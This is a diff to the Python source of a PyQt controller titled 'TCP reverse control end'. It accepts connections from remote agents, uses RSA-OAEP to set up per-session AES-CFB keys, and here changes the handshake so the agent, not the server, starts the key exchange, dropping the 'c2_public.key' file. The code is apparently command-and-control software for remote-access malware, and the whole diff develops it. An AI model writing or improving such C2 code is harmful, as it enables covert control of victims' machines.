@@ -22,7 +22,7 @@ class ClientSignals(QObject):
 
 
 class ClientSession:
-    def __init__(self, conn: socket.socket, addr, pub_blob: bytes, rsa_priv):
+    def __init__(self, conn: socket.socket, addr, rsa_priv):
         self.conn = conn
         self.addr = addr
         self.ip_str = f"{addr[0]}:{addr[1]}"
@@ -36,13 +36,8 @@ class ClientSession:
         self.aes_key: bytes | None = None
         self.rsa_private = rsa_priv
 
-        # 第一步：发送公钥BLOB给agent（握手第一步）
-        header = struct.pack(">I", len(pub_blob))
-        pkt = header + pub_blob
-        try:
-            self.conn.sendall(pkt)
-        except Exception:
-            self.connected = False
+        # =========方案A：不再发送公钥，agent连上后主动发送RSA密文========
+        pass
 
     def _encrypt_packet(self, plain_data: bytes) -> bytes:
         """明文 → IV(16)+AES‑CFB密文"""
@@ -166,9 +161,8 @@ class ClientListModel(QAbstractListModel):
 
 
 class MainWindow(QMainWindow):
-    def __init__(self, pub_blob, rsa_key):
+    def __init__(self, rsa_key):
         super().__init__()
-        self.pub_blob_data = pub_blob
         self.rsa_private_key = rsa_key
 
         self.setWindowTitle("TCP 反向控制端")
@@ -213,8 +207,8 @@ class MainWindow(QMainWindow):
         while self.server_running:
             try:
                 conn, addr = self.server_sock.accept()
-                # 新建会话，立刻传入公钥blob、私钥，构造的时候自动发送公钥给agent
-                sess = ClientSession(conn, addr, self.pub_blob_data, self.rsa_private_key)
+                # 不再传pub_blob
+                sess = ClientSession(conn, addr, self.rsa_private_key)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                 self.client_model.add(sess)
@@ -256,11 +250,10 @@ class MainWindow(QMainWindow):
                     body = bytes(buf[4:total_packet_len])
                     del buf[:total_packet_len]
 
-                    # -------- 握手阶段：还没有完成握手，这个包就是agent返回的256字节RSA密文 --------
+                    # -------- 握手阶段：agent上来直接发送256字节RSA密文 --------
                     if not sess.handshake_done:
                         if body_len == 256:
                             try:
-                                # Windows CryptoAPI RSA‑OAEP‑SHA1解密
                                 aes16 = sess.rsa_private.decrypt(
                                     body,
                                     padding.OAEP(
@@ -376,10 +369,7 @@ def main():
     else:
         exe_dir = os.path.dirname(os.path.abspath(__file__))
 
-    pub_blob_path = os.path.join(exe_dir, "c2_public.key")
-    with open(pub_blob_path, "rb") as f:
-        pub_blob_data = f.read()
-
+    # =========方案A：不再读取 c2_public.key，只读取私钥=========
     pem_path = os.path.join(exe_dir, "private.pem")
     with open(pem_path, "rb") as f:
         rsa_private_key = serialization.load_pem_private_key(
@@ -388,7 +378,7 @@ def main():
         )
 
     app = QApplication(sys.argv)
-    win = MainWindow(pub_blob_data, rsa_private_key)
+    win = MainWindow(rsa_private_key)
     win.show()
     sys.exit(app.exec())
 
